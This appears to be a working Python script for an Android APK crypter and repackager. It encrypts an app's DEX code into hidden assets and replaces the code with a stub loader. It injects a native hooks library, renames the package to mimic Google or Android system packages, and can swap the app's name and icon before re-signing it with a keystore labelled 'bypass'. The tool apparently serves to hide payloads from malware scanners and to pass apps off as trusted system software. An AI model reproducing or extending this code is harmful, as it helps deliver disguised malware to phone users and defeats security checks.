import os, uuid, shutil, subprocess, zipfile, random, string, re
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

STUB = Path(__file__).parent / "stub_smali"
PREBUILT = Path(__file__).parent / "prebuilt"
KEYSTORE = Path("/tmp/bypass.jks")
APKSIGNER = "/opt/android-sdk/build-tools/34.0.0/apksigner"

_PKG_PREFIXES = [
    "com.android.system","com.google.android.gms",
    "com.android.settings","com.android.vending",
    "com.google.android","com.android.providers",
]

def random_package():
    return f"{random.choice(_PKG_PREFIXES)}.{''.join(random.choices(string.ascii_lowercase,k=6))}"

def encrypt_dex(dex_bytes):
    key = os.urandom(32); iv = os.urandom(16)
    enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(dex_bytes, AES.block_size))
    return enc, key+iv

def ensure_keystore():
    if not KEYSTORE.exists():
        subprocess.run(["keytool","-genkeypair","-v",
            "-keystore",str(KEYSTORE),"-storepass","bypass123",
            "-keypass","bypass123","-alias","bypass",
            "-keyalg","RSA","-keysize","2048",
            "-dname","CN=Android,OU=Android,O=Android,L=MV,S=CA,C=US",
            "-validity","10000"], check=True, capture_output=True)

def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playstore"):
    job = Path("/tmp") / str(uuid.uuid4())
    job.mkdir()
    decoded = str(job/"decoded")
    try:
        with zipfile.ZipFile(input_apk) as z:
            dex_bytes = b"".join(z.read(n) for n in z.namelist()
                                 if n.startswith("classes") and n.endswith(".dex"))
        enc_dex, key_iv = encrypt_dex(dex_bytes)

        subprocess.run(["apktool","d",input_apk,"-o",decoded,"--force","--no-res"],
                       check=True, capture_output=True)

        manifest = os.path.join(decoded,"AndroidManifest.xml")
        m = re.search(r'package="([^"]+)"', open(manifest, encoding="utf-8", errors="replace").read())
        orig_pkg = m.group(1) if m else "com.original.app"
        new_pkg  = random_package()

        for d in Path(decoded).iterdir():
            if d.name.startswith("smali"):
                shutil.rmtree(str(d))

        shutil.copytree(str(STUB), os.path.join(decoded,"smali"))

        assets = os.path.join(decoded,"assets")
        os.makedirs(assets, exist_ok=True)
        open(os.path.join(assets,"p.bin"),"wb").write(enc_dex)
        open(os.path.join(assets,"k.bin"),"wb").write(key_iv)

        for abi in ["arm64-v8a","armeabi-v7a"]:
            so = PREBUILT / abi / "libhooks.so"
            if so.exists() and so.stat().st_size > 0:
                lib_dir = os.path.join(decoded,"lib",abi)
                os.makedirs(lib_dir, exist_ok=True)
                shutil.copy(str(so), os.path.join(lib_dir,"libhooks.so"))

        txt = open(manifest, encoding="utf-8", errors="replace").read()
        txt = txt.replace(f'package="{orig_pkg}"', f'package="{new_pkg}"')
        txt = re.sub(r'android:name="[^"]*Application"',
                     'android:name="com.stub.loader.StubApplication"', txt)
        if app_name:
            txt = re.sub(r'android:label="[^"]*"', f'android:label="{app_name}"', txt, count=1)
        if "installLocation" not in txt:
            txt = txt.replace("<manifest ", '<manifest android:installLocation="preferExternal" ', 1)
        open(manifest, "w", encoding="utf-8").write(txt)

        if icon_path:
            for d in Path(decoded).rglob("*"):
                if d.is_dir() and ("mipmap" in d.name or "drawable" in d.name):
                    for f in d.iterdir():
                        if "ic_launcher" in f.name and f.suffix in (".png",".webp"):
                            shutil.copy(icon_path, str(f))

        unsigned = str(job/"unsigned.apk")
        aligned  = str(job/"aligned.apk")

        subprocess.run(["apktool","b",decoded,"-o",unsigned,"--force-all"],
                       check=True, capture_output=True)
        subprocess.run(["zipalign","-f","4",unsigned,aligned],
                       check=True, capture_output=True)

        ensure_keystore()
        subprocess.run([APKSIGNER, "sign",
            "--ks",str(KEYSTORE),"--ks-pass","pass:bypass123",
            "--key-pass","pass:bypass123","--ks-key-alias","bypass",
            "--out",output_apk, aligned],
            check=True, capture_output=True)
    finally:
        shutil.rmtree(str(job), ignore_errors=True)
